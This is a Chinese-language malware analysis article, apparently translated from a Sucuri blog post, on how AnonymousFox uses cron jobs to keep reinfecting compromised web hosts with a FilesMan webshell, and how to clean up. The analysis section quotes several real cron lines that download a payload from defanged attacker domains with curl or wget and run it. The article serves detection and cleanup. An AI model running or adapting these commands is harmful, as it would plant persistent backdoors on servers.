最近，安全研究人员发现 AnonymousFox 在攻击中使用新的定时任务。本文将会介绍其中一个恶意定时任务，讲解其功能以及如何进行识别与删除。

## 什么是定时任务？

cron 是 Linux 环境的定时任务，很多服务器都是运行在 Linux 上的，管理人员经常使用定时任务执行的软件更新与执行备份等任务。

![image.png-28.6kB](https://image.3001.net/images/20220406/1649224809_624d2c694d5b783e33a1f.png!small)cPanel
界面

攻击者也可以滥用定时任务从第三方服务器下载恶意样本。

## 感染

近年来，AnonymousFox 使用了很多种方法来进行持久化感染，避免被简单清除。例如，其恶意进程会不断重新感染，直到被终止。

![image.png-82.7kB](https://image.3001.net/images/20220406/1649224809_624d2c69b43596ec9a3fa.png!small)进程信息

再例如，通过 `.htaccess`禁止执行除了恶意脚本外的 PHP 脚本。

![image.png-56.6kB](https://image.3001.net/images/20220406/1649224810_624d2c6a2ef00b6610c29.png!small)禁止执行

攻击者会将数千个恶意文件写入失陷主机中，这不仅会干扰网站的正常运行（比如拦截用户访问控制面板），还会使清除这些恶意脚本变得非常困难。

恶意的定时任务在后台秘密执行，与恶意的 PHP 脚本配合着感染整个主机，脚本会不断重新感染受害者的定时任务。例如：

![image.png-280.5kB](https://image.3001.net/images/20220406/1649224810_624d2c6a8e6446d22b19d.png!small)部分代码

这种方法与近年来的挖矿恶意软件其实没什么区别。

## 定时任务分析

以 `*/10 * * * * curl -so gojj hxxp://golang666[.]xyz/css[.]index && /bin/sh
gojj /home/[REDACTED]/public_html/[REDACTED] && rm -f gojj`为例，使用 curl
下载恶意样本（AnonymousFox Webshell）：

![image.png-1089.4kB](https://image.3001.net/images/20220406/1649224811_624d2c6b5205a7c98b8fe.png!small)部分代码

写入 `./css/index.php`文件中。

处理后是一个经典的 FilesMan Webshell：

![image.png-412.3kB](https://image.3001.net/images/20220406/1649224814_624d2c6ee59f5e8acac87.png!small)部分代码

不删除定时任务的情况下，主机会反复重新感染。删除恶意脚本前，一定要首先清除定时任务。

攻击者会非常频繁地更换 Payload 部署的地址，每次研究人员跟进调查的时候往往都已经被删除了。发现的部分定时任务：

    
    
    */15 * * * * wget -q -O xxxd hxxp://hello[.]ok2345678[.]xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home/[REDACTED]/public_html 24 && rm -f xxxd*/10 * * * * curl -so gojj hxxp://golang666[.]xyz/css[.]index && /bin/sh gojj /home/[REDACTED]/public_html/[REDACTED] && rm -f gojj* * * * * wget -q -O xxxd5 hxxp://tasks[.]ptfish[.]top/xxxd5 && chmod 0755 xxxd5 && /bin/sh xxxd5 /home/[REDACTED]/public_html && rm -f xxxd5*/22 * * * * wget hxxp://hello[.]turnedpro[.]xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home4/[REDACTED]/[REDACTED] c233 && rm -f xxxd* * * * * wget -q -O xxxd hxxp://hello[.]hahaha666[.]xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home/[REDACTED]/public_html 24 && rm -f xxxd﻿

这些定时任务的目的都是相同的，重新感染主机阻碍恶意软件清除过程。

## 总结

AnonymousFox 是非常常见的恶意软件，其攻击具有侵略性和持续性，必须认真清理才能防止其卷土重来。

## 参考来源

> [Sucuri](https://blog.sucuri.net/2022/03/new-wave-of-anonymousfox-cron-> jobs.html)

